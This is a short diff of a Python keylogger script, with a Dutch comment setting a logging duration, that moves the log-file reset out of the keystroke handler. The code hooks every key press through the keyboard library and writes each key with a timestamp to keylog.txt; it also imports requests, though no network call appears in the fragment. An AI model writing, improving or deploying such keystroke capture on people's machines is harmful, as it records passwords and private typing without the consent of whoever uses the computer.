@@ -1,11 +1,8 @@
 import keyboard, time, requests
 from datetime import datetime, timedelta
-firstTime = 0
+print("", file=open("keylog.txt", "w"))
 def log_keystroke(event):
     key = event.name
-    if (firstTime == 0):
-        print("", file=open("keylog.txt", "w"))
-        firstTime = 1
     print(f"[{datetime.now().strftime('%H:%M:%S')}] {key}", file=open("keylog.txt", "a"))
 
 # Stel de logging duur in minuten (standaard 15 minuten)
